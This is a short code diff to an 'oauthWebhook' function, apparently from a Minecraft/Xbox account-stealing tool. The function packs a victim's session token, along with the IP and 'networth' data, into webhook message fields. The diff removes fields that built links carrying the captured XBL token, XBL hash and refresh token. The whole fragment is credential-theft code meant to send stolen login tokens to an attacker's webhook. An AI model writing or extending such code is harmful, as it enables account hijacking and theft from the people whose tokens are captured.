@@ -32,16 +32,6 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         {
             "name": "Session Token",
             "value": `\`\`\`${session_token}\`\`\``
-        },
-        {
-            "name": "Refresh XBL Token",
-            "value": `[Click Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token})`,
-            "inline": true
-        },
-        {
-            "name": "Refresh Refresh Token",
-            "value": `[Click Here](${refreshURL}?refresh_token=${refresh_token})`,
-            "inline": true
         }
     ]
     if (description !== "Error getting networth") {
